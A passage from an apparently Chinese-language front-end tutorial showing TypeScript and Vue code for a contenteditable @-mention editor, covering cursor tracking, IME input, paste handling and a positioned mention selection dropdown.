  <span class="hljs-keyword">if</span> (node.<span class="hljs-property">nodeType</span> !== <span class="hljs-title class_">Node</span>.<span class="hljs-property">ELEMENT_NODE</span>) <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;
  <span class="hljs-keyword">const</span> el = node <span class="hljs-keyword">as</span> <span class="hljs-title class_">HTMLElement</span>;
  <span class="hljs-keyword">return</span> el.<span class="hljs-title function_">getAttribute</span>(<span class="hljs-string">'data-type'</span>) === <span class="hljs-string">'solution'</span> || el.<span class="hljs-property">tagName</span>?.<span class="hljs-title function_">toLowerCase</span>() === <span class="hljs-string">'br'</span>;
};

<span class="hljs-comment">/**
 * 获取光标位置前后的文本内容（包括跨节点）
 * <span class="hljs-doctag">@param</span> <span class="hljs-variable">selection</span> - 当前选择对象
 * <span class="hljs-doctag">@param</span> <span class="hljs-variable">maxLength</span> - 最大搜索长度
 * <span class="hljs-doctag">@returns</span> 文本内容和光标位置
 */</span>
<span class="hljs-keyword">const</span> getTextAroundCursor = (
  <span class="hljs-attr">selection</span>: <span class="hljs-title class_">Selection</span>,
  maxLength = <span class="hljs-variable constant_">TEXT_SEARCH_MAX_LENGTH</span>
): { <span class="hljs-attr">text</span>: string; <span class="hljs-attr">cursorPos</span>: number } | <span class="hljs-function"><span class="hljs-params">null</span> =&gt;</span> {
  <span class="hljs-keyword">if</span> (!selection?.<span class="hljs-property">anchorNode</span> || !editorRef.<span class="hljs-property">value</span>) <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;

  <span class="hljs-keyword">const</span> { anchorNode, anchorOffset } = selection;

  <span class="hljs-keyword">if</span> (anchorNode.<span class="hljs-property">nodeType</span> === <span class="hljs-title class_">Node</span>.<span class="hljs-property">TEXT_NODE</span>) {
    <span class="hljs-keyword">const</span> text = anchorNode.<span class="hljs-property">textContent</span> ?? <span class="hljs-string">''</span>;
    <span class="hljs-keyword">return</span> { text, <span class="hljs-attr">cursorPos</span>: anchorOffset };
  }

  <span class="hljs-keyword">const</span> <span class="hljs-attr">beforeText</span>: string[] = [];
  <span class="hljs-keyword">let</span> cursorPos = <span class="hljs-number">0</span>;
  <span class="hljs-keyword">let</span> foundCursor = <span class="hljs-literal">false</span>;

  <span class="hljs-comment">// 向前搜索</span>
  <span class="hljs-keyword">let</span> <span class="hljs-attr">node</span>: <span class="hljs-title class_">Node</span> | <span class="hljs-literal">null</span> = anchorNode;
  <span class="hljs-keyword">while</span> (node &amp;&amp; beforeText.<span class="hljs-title function_">join</span>(<span class="hljs-string">''</span>).<span class="hljs-property">length</span> &lt; maxLength) {
    <span class="hljs-keyword">if</span> (node.<span class="hljs-property">nodeType</span> === <span class="hljs-title class_">Node</span>.<span class="hljs-property">TEXT_NODE</span>) {
      <span class="hljs-keyword">const</span> nodeText = node.<span class="hljs-property">textContent</span> ?? <span class="hljs-string">''</span>;
      <span class="hljs-keyword">if</span> (node === anchorNode) {
        beforeText.<span class="hljs-title function_">unshift</span>(nodeText.<span class="hljs-title function_">slice</span>(<span class="hljs-number">0</span>, anchorOffset));
        cursorPos = nodeText.<span class="hljs-title function_">slice</span>(<span class="hljs-number">0</span>, anchorOffset).<span class="hljs-property">length</span>;
        foundCursor = <span class="hljs-literal">true</span>;
      } <span class="hljs-keyword">else</span> {
        beforeText.<span class="hljs-title function_">unshift</span>(nodeText);
        <span class="hljs-keyword">if</span> (!foundCursor) {
          cursorPos += nodeText.<span class="hljs-property">length</span>;
        }
      }
    } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (<span class="hljs-title function_">shouldStopSearch</span>(node)) {
      <span class="hljs-keyword">break</span>;
    }
    node = node.<span class="hljs-property">previousSibling</span>;
  }

  <span class="hljs-comment">// 向后搜索</span>
  <span class="hljs-keyword">const</span> <span class="hljs-attr">afterText</span>: string[] = [];
  node = anchorNode.<span class="hljs-property">nextSibling</span>;
  <span class="hljs-keyword">while</span> (node &amp;&amp; beforeText.<span class="hljs-title function_">join</span>(<span class="hljs-string">''</span>).<span class="hljs-property">length</span> + afterText.<span class="hljs-title function_">join</span>(<span class="hljs-string">''</span>).<span class="hljs-property">length</span> &lt; maxLength) {
    <span class="hljs-keyword">if</span> (node.<span class="hljs-property">nodeType</span> === <span class="hljs-title class_">Node</span>.<span class="hljs-property">TEXT_NODE</span>) {
      afterText.<span class="hljs-title function_">push</span>(node.<span class="hljs-property">textContent</span> ?? <span class="hljs-string">''</span>);
    } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (<span class="hljs-title function_">shouldStopSearch</span>(node)) {
      <span class="hljs-keyword">break</span>;
    }
    node = node.<span class="hljs-property">nextSibling</span>;
  }

  <span class="hljs-keyword">return</span> {
    <span class="hljs-attr">text</span>: beforeText.<span class="hljs-title function_">join</span>(<span class="hljs-string">''</span>) + afterText.<span class="hljs-title function_">join</span>(<span class="hljs-string">''</span>),
    cursorPos,
  };
};

<span class="hljs-comment">// ==================== 输入处理 ====================</span>
<span class="hljs-comment">/**
 * 恢复编辑器内容（用于字符数超限时）
 */</span>
<span class="hljs-keyword">const</span> restoreEditorContent = (): <span class="hljs-function"><span class="hljs-params">void</span> =&gt;</span> {
  <span class="hljs-keyword">const</span> editor = editorRef.<span class="hljs-property">value</span>;
  <span class="hljs-keyword">if</span> (!editor) <span class="hljs-keyword">return</span>;

  <span class="hljs-keyword">const</span> content = <span class="hljs-title function_">getContent</span>(<span class="hljs-title function_">getHtml</span>());
  editor.<span class="hljs-property">innerHTML</span> = <span class="hljs-string">''</span>;

  content.<span class="hljs-title function_">forEach</span>(<span class="hljs-function">(<span class="hljs-params">item</span>) =&gt;</span> {
    <span class="hljs-keyword">if</span> (item.<span class="hljs-property">type</span> === <span class="hljs-string">'text'</span>) {
      editor.<span class="hljs-title function_">appendChild</span>(<span class="hljs-title function_">createTextNode</span>(item.<span class="hljs-property">content</span>));
    } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (item.<span class="hljs-property">type</span> === <span class="hljs-string">'solution'</span>) {
      editor.<span class="hljs-title function_">appendChild</span>(<span class="hljs-title function_">createMentionSpan</span>(item.<span class="hljs-property">content</span>, item.<span class="hljs-property">id</span> ?? <span class="hljs-string">''</span>));
      editor.<span class="hljs-title function_">appendChild</span>(<span class="hljs-title function_">createTextNode</span>(<span class="hljs-string">' '</span>));
    }
  });
};

<span class="hljs-comment">/**
 * 检查并处理 @ 符号
 * <span class="hljs-doctag">@param</span> <span class="hljs-variable">text</span> - 文本内容
 * <span class="hljs-doctag">@param</span> <span class="hljs-variable">cursorPos</span> - 光标位置
 * <span class="hljs-doctag">@returns</span> 是否检测到 @ 符号
 */</span>
<span class="hljs-keyword">const</span> checkAtSymbol = (<span class="hljs-attr">text</span>: string, <span class="hljs-attr">cursorPos</span>: number): <span class="hljs-function"><span class="hljs-params">boolean</span> =&gt;</span> {
  <span class="hljs-keyword">const</span> lastAt = text.<span class="hljs-title function_">lastIndexOf</span>(<span class="hljs-string">'@'</span>, cursorPos - <span class="hljs-number">1</span>);
  <span class="hljs-keyword">const</span> isAtSymbol = lastAt &gt;= <span class="hljs-number">0</span> &amp;&amp; cursorPos === lastAt + <span class="hljs-number">1</span>;

  <span class="hljs-keyword">if</span> (isAtSymbol) {
    queryText.<span class="hljs-property">value</span> = text.<span class="hljs-title function_">slice</span>(lastAt + <span class="hljs-number">1</span>, cursorPos);
    showDropdown.<span class="hljs-property">value</span> = <span class="hljs-literal">true</span>;
    <span class="hljs-title function_">saveCursorPosition</span>();
    <span class="hljs-title function_">updateDropdownPosition</span>();
  } <span class="hljs-keyword">else</span> {
    showDropdown.<span class="hljs-property">value</span> = <span class="hljs-literal">false</span>;
  }

  <span class="hljs-keyword">return</span> isAtSymbol;
};

<span class="hljs-comment">/**
 * 输入监听
 */</span>
<span class="hljs-keyword">const</span> onInput = (): <span class="hljs-function"><span class="hljs-params">void</span> =&gt;</span> {
  <span class="hljs-keyword">if</span> (isComposing.<span class="hljs-property">value</span>) <span class="hljs-keyword">return</span>;

  <span class="hljs-keyword">const</span> currentText = <span class="hljs-title function_">getPlainText</span>();
  <span class="hljs-keyword">if</span> (<span class="hljs-title function_">isOverCharacterLimit</span>(currentText)) {
    <span class="hljs-title class_">Message</span>.<span class="hljs-title function_">warning</span>(<span class="hljs-string">`内容不能超过 <span class="hljs-subst">${MAX_CHARACTERS}</span> 个字符`</span>);
    <span class="hljs-title function_">restoreEditorContent</span>();
    <span class="hljs-keyword">return</span>;
  }

  <span class="hljs-keyword">const</span> sel = <span class="hljs-variable language_">window</span>.<span class="hljs-title function_">getSelection</span>();
  <span class="hljs-keyword">if</span> (!sel?.<span class="hljs-property">anchorNode</span>) {
    showDropdown.<span class="hljs-property">value</span> = <span class="hljs-literal">false</span>;
    <span class="hljs-title function_">onChange</span>();
    <span class="hljs-keyword">return</span>;
  }

  <span class="hljs-keyword">const</span> textNode = <span class="hljs-title function_">getTextNodeAtCursor</span>(sel);
  <span class="hljs-keyword">if</span> (textNode) {
    <span class="hljs-keyword">const</span> text = textNode.<span class="hljs-property">textContent</span> ?? <span class="hljs-string">''</span>;
    <span class="hljs-keyword">const</span> cursorPos = sel.<span class="hljs-property">anchorOffset</span>;
    <span class="hljs-title function_">checkAtSymbol</span>(text, cursorPos);
  } <span class="hljs-keyword">else</span> {
    <span class="hljs-keyword">const</span> textInfo = <span class="hljs-title function_">getTextAroundCursor</span>(sel);
    <span class="hljs-keyword">if</span> (textInfo) {
      <span class="hljs-title function_">checkAtSymbol</span>(textInfo.<span class="hljs-property">text</span>, textInfo.<span class="hljs-property">cursorPos</span>);
    } <span class="hljs-keyword">else</span> {
      showDropdown.<span class="hljs-property">value</span> = <span class="hljs-literal">false</span>;
    }
  }

  <span class="hljs-title function_">onChange</span>();
};

<span class="hljs-comment">// ==================== Mention 插入 ====================</span>
<span class="hljs-comment">/**
 * 插入 mention
 * <span class="hljs-doctag">@param</span> <span class="hljs-variable">user</span> - 用户信息
 */</span>
<span class="hljs-keyword">const</span> selectUser = (<span class="hljs-attr">user</span>: <span class="hljs-title class_">IMentionUser</span>): <span class="hljs-function"><span class="hljs-params">void</span> =&gt;</span> {
  <span class="hljs-keyword">const</span> currentText = <span class="hljs-title function_">getPlainText</span>();
  <span class="hljs-keyword">const</span> newTextLength = currentText.<span class="hljs-property">length</span> + user.<span class="hljs-property">name</span>.<span class="hljs-property">length</span>;

  <span class="hljs-keyword">if</span> (newTextLength &gt; <span class="hljs-variable constant_">MAX_CHARACTERS</span>) {
    <span class="hljs-title class_">Message</span>.<span class="hljs-title function_">warning</span>(<span class="hljs-string">`插入内容后不能超过 <span class="hljs-subst">${MAX_CHARACTERS}</span> 个字符`</span>);
    <span class="hljs-keyword">return</span>;
  }

  <span class="hljs-keyword">if</span> (savedRange.<span class="hljs-property">value</span>) {
    <span class="hljs-title function_">restoreCursorPosition</span>();
  }

  <span class="hljs-keyword">const</span> sel = <span class="hljs-variable language_">window</span>.<span class="hljs-title function_">getSelection</span>();
  <span class="hljs-keyword">if</span> (!sel?.<span class="hljs-property">rangeCount</span>) <span class="hljs-keyword">return</span>;

  <span class="hljs-keyword">const</span> range = sel.<span class="hljs-title function_">getRangeAt</span>(<span class="hljs-number">0</span>);
  <span class="hljs-keyword">const</span> textNode = <span class="hljs-title function_">getTextNodeAtCursor</span>(sel);

  <span class="hljs-keyword">if</span> (textNode) {
    <span class="hljs-keyword">const</span> cursorPos = sel.<span class="hljs-property">anchorOffset</span>;
    <span class="hljs-keyword">const</span> text = textNode.<span class="hljs-property">textContent</span> ?? <span class="hljs-string">''</span>;
    <span class="hljs-keyword">const</span> lastAt = text.<span class="hljs-title function_">lastIndexOf</span>(<span class="hljs-string">'@'</span>, cursorPos - <span class="hljs-number">1</span>);

    <span class="hljs-keyword">if</span> (lastAt &gt;= <span class="hljs-number">0</span>) {
      textNode.<span class="hljs-title function_">deleteData</span>(lastAt, cursorPos - lastAt);
    }
  }

  <span class="hljs-keyword">const</span> span = <span class="hljs-title function_">createMentionSpan</span>(user.<span class="hljs-property">name</span>, user.<span class="hljs-property">id</span>);
  range.<span class="hljs-title function_">insertNode</span>(span);
  range.<span class="hljs-title function_">collapse</span>(<span class="hljs-literal">false</span>);
  <span class="hljs-title function_">updateSelection</span>(range);

  <span class="hljs-title function_">resetDropdownState</span>();
  <span class="hljs-title function_">onChange</span>();
};

<span class="hljs-comment">// ==================== 中文输入法处理 ====================</span>
<span class="hljs-comment">/**
 * 中文输入法开始
 */</span>
<span class="hljs-keyword">const</span> onCompositionStart = (): <span class="hljs-function"><span class="hljs-params">void</span> =&gt;</span> {
  isComposing.<span class="hljs-property">value</span> = <span class="hljs-literal">true</span>;
};

<span class="hljs-comment">/**
 * 中文输入法更新
 */</span>
<span class="hljs-keyword">const</span> onCompositionUpdate = (): <span class="hljs-function"><span class="hljs-params">void</span> =&gt;</span> {
  isComposing.<span class="hljs-property">value</span> = <span class="hljs-literal">true</span>;
};

<span class="hljs-comment">/**
 * 中文输入法结束
 */</span>
<span class="hljs-keyword">const</span> onCompositionEnd = (): <span class="hljs-function"><span class="hljs-params">void</span> =&gt;</span> {
  isComposing.<span class="hljs-property">value</span> = <span class="hljs-literal">false</span>;
  <span class="hljs-built_in">setTimeout</span>(<span class="hljs-function">() =&gt;</span> {
    <span class="hljs-title function_">onInput</span>();
  }, <span class="hljs-number">0</span>);
};

<span class="hljs-comment">// ==================== 内容插入工具 ====================</span>
<span class="hljs-comment">/**
 * 将文本内容转换为 DOM 节点（处理换行符）
 * <span class="hljs-doctag">@param</span> <span class="hljs-variable">text</span> - 文本内容
 * <span class="hljs-doctag">@param</span> <span class="hljs-variable">fragment</span> - 文档片段
 */</span>
<span class="hljs-keyword">const</span> appendTextWithBreaks = (<span class="hljs-attr">text</span>: string, <span class="hljs-attr">fragment</span>: <span class="hljs-title class_">DocumentFragment</span>): <span class="hljs-function"><span class="hljs-params">void</span> =&gt;</span> {
  <span class="hljs-keyword">const</span> textParts = text.<span class="hljs-title function_">split</span>(<span class="hljs-string">'\n'</span>);
  textParts.<span class="hljs-title function_">forEach</span>(<span class="hljs-function">(<span class="hljs-params">part, index</span>) =&gt;</span> {
    <span class="hljs-keyword">if</span> (part) {
      fragment.<span class="hljs-title function_">appendChild</span>(<span class="hljs-title function_">createTextNode</span>(part));
    }
    <span class="hljs-keyword">if</span> (index &lt; textParts.<span class="hljs-property">length</span> - <span class="hljs-number">1</span>) {
      fragment.<span class="hljs-title function_">appendChild</span>(<span class="hljs-title function_">createBreakElement</span>());
    }
  });
};

<span class="hljs-comment">/**
 * 在光标位置插入内容
 * <span class="hljs-doctag">@param</span> <span class="hljs-variable">content</span> - 要插入的内容数组
 * <span class="hljs-doctag">@param</span> <span class="hljs-variable">range</span> - 当前光标范围
 */</span>
<span class="hljs-keyword">const</span> insertContentAtCursor = (<span class="hljs-attr">content</span>: <span class="hljs-title class_">IContentItem</span>[], <span class="hljs-attr">range</span>: <span class="hljs-title class_">Range</span>): <span class="hljs-function"><span class="hljs-params">void</span> =&gt;</span> {
  <span class="hljs-keyword">const</span> fragment = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">createDocumentFragment</span>();

  content.<span class="hljs-title function_">forEach</span>(<span class="hljs-function">(<span class="hljs-params">item</span>) =&gt;</span> {
    <span class="hljs-keyword">if</span> (item.<span class="hljs-property">type</span> === <span class="hljs-string">'text'</span>) {
      <span class="hljs-title function_">appendTextWithBreaks</span>(item.<span class="hljs-property">content</span>, fragment);
    } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (item.<span class="hljs-property">type</span> === <span class="hljs-string">'solution'</span>) {
      fragment.<span class="hljs-title function_">appendChild</span>(<span class="hljs-title function_">createMentionSpan</span>(item.<span class="hljs-property">content</span>, item.<span class="hljs-property">id</span> ?? <span class="hljs-string">''</span>));
    }
  });

  range.<span class="hljs-title function_">insertNode</span>(fragment);

  <span class="hljs-keyword">const</span> { lastChild } = fragment;
  <span class="hljs-keyword">if</span> (lastChild?.<span class="hljs-property">parentNode</span>) {
    <span class="hljs-title function_">moveCursorToEnd</span>(range, lastChild);
  } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (editorRef.<span class="hljs-property">value</span>) {
    range.<span class="hljs-title function_">selectNodeContents</span>(editorRef.<span class="hljs-property">value</span>);
    range.<span class="hljs-title function_">collapse</span>(<span class="hljs-literal">false</span>);
    <span class="hljs-title function_">updateSelection</span>(range);
  }
};

<span class="hljs-comment">// ==================== 粘贴处理 ====================</span>
<span class="hljs-comment">/**
 * 粘贴处理
 * <span class="hljs-doctag">@param</span> <span class="hljs-variable">e</span> - 粘贴事件
 */</span>
<span class="hljs-keyword">const</span> onPaste = (<span class="hljs-attr">e</span>: <span class="hljs-title class_">ClipboardEvent</span>): <span class="hljs-function"><span class="hljs-params">void</span> =&gt;</span> {
  e.<span class="hljs-title function_">preventDefault</span>();

  <span class="hljs-keyword">const</span> range = <span class="hljs-title function_">getCurrentRange</span>();
  <span class="hljs-keyword">if</span> (!range) <span class="hljs-keyword">return</span>;

  <span class="hljs-keyword">const</span> text = e.<span class="hljs-property">clipboardData</span>?.<span class="hljs-title function_">getData</span>(<span class="hljs-string">'text/plain'</span>) ?? <span class="hljs-string">''</span>;
  <span class="hljs-keyword">const</span> html = e.<span class="hljs-property">clipboardData</span>?.<span class="hljs-title function_">getData</span>(<span class="hljs-string">'text/html'</span>) ?? <span class="hljs-string">''</span>;

  <span class="hljs-keyword">const</span> currentText = <span class="hljs-title function_">getPlainText</span>();
  <span class="hljs-keyword">let</span> pasteText = <span class="hljs-string">''</span>;

  <span class="hljs-keyword">if</span> (html) {
    <span class="hljs-keyword">const</span> content = <span class="hljs-title function_">getContent</span>(html);
    pasteText = content.<span class="hljs-title function_">map</span>(<span class="hljs-function">(<span class="hljs-params">item</span>) =&gt;</span> item.<span class="hljs-property">content</span>).<span class="hljs-title function_">join</span>(<span class="hljs-string">''</span>);
  } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (text) {
    pasteText = text;
  }

  <span class="hljs-keyword">if</span> (currentText.<span class="hljs-property">length</span> + pasteText.<span class="hljs-property">length</span> &gt; <span class="hljs-variable constant_">MAX_CHARACTERS</span>) {
    <span class="hljs-title class_">Message</span>.<span class="hljs-title function_">warning</span>(<span class="hljs-string">`粘贴内容后不能超过 <span class="hljs-subst">${MAX_CHARACTERS}</span> 个字符`</span>);
    <span class="hljs-keyword">return</span>;
  }

  <span class="hljs-keyword">if</span> (html) {
    <span class="hljs-keyword">const</span> content = <span class="hljs-title function_">getContent</span>(html);
    <span class="hljs-title function_">insertContentAtCursor</span>(content, range);
  } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (text) {
    <span class="hljs-keyword">const</span> fragment = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">createDocumentFragment</span>();
    <span class="hljs-title function_">appendTextWithBreaks</span>(text, fragment);
    range.<span class="hljs-title function_">insertNode</span>(fragment);

    <span class="hljs-keyword">const</span> { lastChild } = fragment;
    <span class="hljs-keyword">if</span> (lastChild?.<span class="hljs-property">parentNode</span>) {
      <span class="hljs-title function_">moveCursorToEnd</span>(range, lastChild);
    } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (editorRef.<span class="hljs-property">value</span>) {
      range.<span class="hljs-title function_">selectNodeContents</span>(editorRef.<span class="hljs-property">value</span>);
      range.<span class="hljs-title function_">collapse</span>(<span class="hljs-literal">false</span>);
      <span class="hljs-title function_">updateSelection</span>(range);
    }
  }

  <span class="hljs-title function_">onChange</span>();
};

<span class="hljs-comment">// ==================== 内容设置 ====================</span>
<span class="hljs-comment">/**
 * 从 JSON 渲染回编辑器
 * <span class="hljs-doctag">@param</span> <span class="hljs-variable">content</span> - 内容数组
 */</span>
<span class="hljs-keyword">const</span> setContent = (<span class="hljs-attr">content</span>: <span class="hljs-title class_">IContentItem</span>[]): <span class="hljs-function"><span class="hljs-params">void</span> =&gt;</span> {
  <span class="hljs-keyword">if</span> (!editorRef.<span class="hljs-property">value</span>) <span class="hljs-keyword">return</span>;

  editorRef.<span class="hljs-property">value</span>.<span class="hljs-property">innerHTML</span> = <span class="hljs-string">''</span>;
  <span class="hljs-keyword">const</span> editor = editorRef.<span class="hljs-property">value</span>;

  content.<span class="hljs-title function_">forEach</span>(<span class="hljs-function">(<span class="hljs-params">item</span>) =&gt;</span> {
    <span class="hljs-keyword">if</span> (item.<span class="hljs-property">type</span> === <span class="hljs-string">'text'</span>) {
      <span class="hljs-title function_">appendTextWithBreaks</span>(item.<span class="hljs-property">content</span>, editor <span class="hljs-keyword">as</span> unknown <span class="hljs-keyword">as</span> <span class="hljs-title class_">DocumentFragment</span>);
    } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (item.<span class="hljs-property">type</span> === <span class="hljs-string">'solution'</span>) {
      editor.<span class="hljs-title function_">appendChild</span>(<span class="hljs-title function_">createMentionSpan</span>(item.<span class="hljs-property">content</span>, item.<span class="hljs-property">id</span> ?? <span class="hljs-string">''</span>));
      editor.<span class="hljs-title function_">appendChild</span>(<span class="hljs-title function_">createTextNode</span>(<span class="hljs-string">' '</span>));
    }
  });
};

<span class="hljs-comment">// ==================== 数据获取 ====================</span>


<span class="hljs-comment">// ==================== 生命周期 ====================</span>
<span class="hljs-title function_">onMounted</span>(<span class="hljs-function">() =&gt;</span> {
  <span class="hljs-comment">//数据获取</span>
  <span class="hljs-comment">// 传递格式化后的json 调用setContent 恢复html</span>
});
</code></pre>
<h4 data-id="heading-7">2️⃣ MentionModal.vue（选择弹窗）</h4>
<pre><code class="hljs language-html" lang="html"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"mention-modal"</span> <span class="hljs-attr">ref</span>=<span class="hljs-string">"modalRef"</span> <span class="hljs-attr">:style</span>=<span class="hljs-string">"{ top: top, left: left }"</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">mtd-select</span>
      <span class="hljs-attr">ref</span>=<span class="hljs-string">"selectRef"</span>
      <span class="hljs-attr">class</span>=<span class="hljs-string">"select-width"</span>
      <span class="hljs-attr">filterable</span>
      <span class="hljs-attr">value-key</span>=<span class="hljs-string">"id"</span>
      @<span class="hljs-attr">change</span>=<span class="hljs-string">"insertMentionHandler"</span>
      @<span class="hljs-attr">update:visible</span>=<span class="hljs-string">"updateVisible"</span>
    &gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">mtd-option</span> <span class="hljs-attr">v-for</span>=<span class="hljs-string">"item in searchedList"</span> <span class="hljs-attr">:key</span>=<span class="hljs-string">"item.id"</span> <span class="hljs-attr">:label</span>=<span class="hljs-string">"item.name"</span> <span class="hljs-attr">:value</span>=<span class="hljs-string">"item"</span>&gt;</span> <span class="hljs-tag">&lt;/<span class="hljs-name">mtd-option</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">mtd-select</span>&gt;</span>
  <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
</code></pre>
<ul>
<li>
<p>智能定位：跟随光标位置弹出</p>
</li>
<li>
<p>搜索过滤：支持方案名称快速筛选</p>
</li>
<li>
<p>边界处理：自动调整位置防止超出容器</p>
</li>
</ul>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">// 定义emit</span>
<span class="hljs-keyword">const</span> emit = <span class="hljs-title function_">defineEmits</span>([<span class="hljs-string">'hideMentionModal'</span>, <span class="hljs-string">'insertMention'</span>]);
<span class="hljs-keyword">const</span> selectRef = <span class="hljs-title function_">ref</span>();
<span class="hljs-keyword">const</span> modalRef = ref&lt;<span class="hljs-title class_">HTMLElement</span> | <span class="hljs-literal">null</span>&gt;(<span class="hljs-literal">null</span>);
<span class="hljs-comment">// 响应式数据</span>
<span class="hljs-keyword">const</span> top = <span class="hljs-title function_">ref</span>(<span class="hljs-string">''</span>);
<span class="hljs-keyword">const</span> left = <span class="hljs-title function_">ref</span>(<span class="hljs-string">''</span>);
<span class="hljs-keyword">const</span> searchVal = <span class="hljs-title function_">ref</span>(<span class="hljs-string">''</span>);

<span class="hljs-comment">// 计算属性：根据搜索值筛选列表</span>
<span class="hljs-keyword">const</span> searchedList = <span class="hljs-title function_">computed</span>(<span class="hljs-function">() =&gt;</span> {
  <span class="hljs-keyword">const</span> searchValue = searchVal.<span class="hljs-property">value</span>.<span class="hljs-title function_">trim</span>().<span class="hljs-title function_">toLowerCase</span>();
  <span class="hljs-keyword">return</span> list.<span class="hljs-title function_">filter</span>(<span class="hljs-function">(<span class="hljs-params">item</span>) =&gt;</span> {
    <span class="hljs-keyword">const</span> name = item.<span class="hljs-property">name</span>.<span class="hljs-title function_">toLowerCase</span>();
    <span class="hljs-keyword">return</span> name.<span class="hljs-title function_">indexOf</span>(searchValue) &gt;= <span class="hljs-number">0</span>;
  });
});

<span class="hljs-comment">/**
 * 插入提及处理
 * <span class="hljs-doctag">@param</span> {<span class="hljs-type">object</span>} <span class="hljs-variable">value</span> - 选中项
 * <span class="hljs-doctag">@param</span> {<span class="hljs-type">string</span>} value.id - 方案ID
 * <span class="hljs-doctag">@param</span> {<span class="hljs-type">string</span>} value.name - 方案名称
 */</span>
<span class="hljs-keyword">const</span> <span class="hljs-title function_">insertMentionHandler</span> = (<span class="hljs-params">value: { id: string; name: string }</span>) =&gt; {
  <span class="hljs-title function_">emit</span>(<span class="hljs-string">'insertMention'</span>, value);
  <span class="hljs-title function_">emit</span>(<span class="hljs-string">'hideMentionModal'</span>); <span class="hljs-comment">// 隐藏 modal</span>
};

<span class="hljs-keyword">const</span> <span class="hljs-title function_">updateVisible</span> = (<span class="hljs-params">visible: boolean</span>) =&gt; {
  <span class="hljs-keyword">if</span> (!visible) {
    <span class="hljs-title function_">emit</span>(<span class="hljs-string">'hideMentionModal'</span>);
  }
};

<span class="hljs-comment">/**
 * 获取光标在可编辑容器中的相对坐标
 * <span class="hljs-doctag">@param</span> {<span class="hljs-type">Element</span>} <span class="hljs-variable">container</span> - 可编辑容器元素
 * <span class="hljs-doctag">@returns</span> {<span class="hljs-type">{ left: number; top: number </span>} | null}
 */</span>
<span class="hljs-keyword">const</span> <span class="hljs-title function_">getCursorPositionInDiv</span> = (<span class="hljs-params">container: Element</span>) =&gt; {
  <span class="hljs-keyword">const</span> selection = <span class="hljs-variable language_">window</span>.<span class="hljs-title function_">getSelection</span>();
  <span class="hljs-keyword">if</span> (selection &amp;&amp; selection.<span class="hljs-property">rangeCount</span> &gt; <span class="hljs-number">0</span>) {
    <span class="hljs-keyword">const</span> range = selection.<span class="hljs-title function_">getRangeAt</span>(<span class="hljs-number">0</span>);
    <span class="hljs-keyword">const</span> rect = range.<span class="hljs-title function_">getBoundingClientRect</span>();

    <span class="hljs-comment">// 获取容器相对于视口的位置</span>
    <span class="hljs-keyword">const</span> containerRect = container.<span class="hljs-title function_">getBoundingClientRect</span>();

    <span class="hljs-comment">// 计算光标相对于容器的位置</span>
    <span class="hljs-keyword">const</span> relativePosition = {
      <span class="hljs-attr">left</span>: rect.<span class="hljs-property">left</span> - containerRect.<span class="hljs-property">left</span>,
      <span class="hljs-attr">top</span>: rect.<span class="hljs-property">top</span> - containerRect.<span class="hljs-property">top</span>,
    };

    <span class="hljs-keyword">return</span> relativePosition;
  }
  <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;
};

<span class="hljs-comment">/**
 * 约束弹层不超出容器右边界
 * <span class="hljs-doctag">@param</span> {<span class="hljs-type">Element</span>} <span class="hljs-variable">container</span> - 可编辑容器元素
 * <span class="hljs-doctag">@param</span> {<span class="hljs-type">number</span>} <span class="hljs-variable">desiredLeft</span> - 期望的左偏移（相对容器）
 * <span class="hljs-doctag">@returns</span> {<span class="hljs-type">number</span>} - 修正后的左偏移
 */</span>
<span class="hljs-keyword">const</span> clampLeftWithinContainer = (<span class="hljs-attr">container</span>: <span class="hljs-title class_">Element</span>, <span class="hljs-attr">desiredLeft</span>: number): <span class="hljs-function"><span class="hljs-params">number</span> =&gt;</span> {
  <span class="hljs-keyword">const</span> containerRect = container.<span class="hljs-title function_">getBoundingClientRect</span>();
  <span class="hljs-keyword">const</span> modalEl = modalRef.<span class="hljs-property">value</span>;
  <span class="hljs-keyword">if</span> (!modalEl) {
    <span class="hljs-keyword">return</span> <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">max</span>(<span class="hljs-number">0</span>, desiredLeft);
  }
  <span class="hljs-keyword">const</span> modalRect = modalEl.<span class="hljs-title function_">getBoundingClientRect</span>();
  <span class="hljs-keyword">const</span> modalWidth = modalRect.<span class="hljs-property">width</span> || modalEl.<span class="hljs-property">offsetWidth</span> || <span class="hljs-number">0</span>;
  <span class="hljs-keyword">const</span> containerWidth = containerRect.<span class="hljs-property">width</span>;

  <span class="hljs-comment">// 右侧溢出量（&gt;0 表示会溢出）</span>
  <span class="hljs-keyword">const</span> overflowRight = desiredLeft + modalWidth - containerWidth;
  <span class="hljs-keyword">if</span> (overflowRight &gt; <span class="hljs-number">0</span>) {
    <span class="hljs-comment">// 预留8px安全边距</span>
    <span class="hljs-keyword">return</span> <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">max</span>(<span class="hljs-number">0</span>, desiredLeft - overflowRight - <span class="hljs-number">8</span>);
  }
  <span class="hljs-comment">// 不允许出现负数（左侧越界）</span>
  <span class="hljs-keyword">return</span> <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">max</span>(<span class="hljs-number">0</span>, desiredLeft);
};

<span class="hljs-comment">// 组件挂载后执行</span>
<span class="hljs-title function_">onMounted</span>(<span class="hljs-keyword">async</span> () =&gt; {
  <span class="hljs-comment">// 等待DOM更新完成</span>
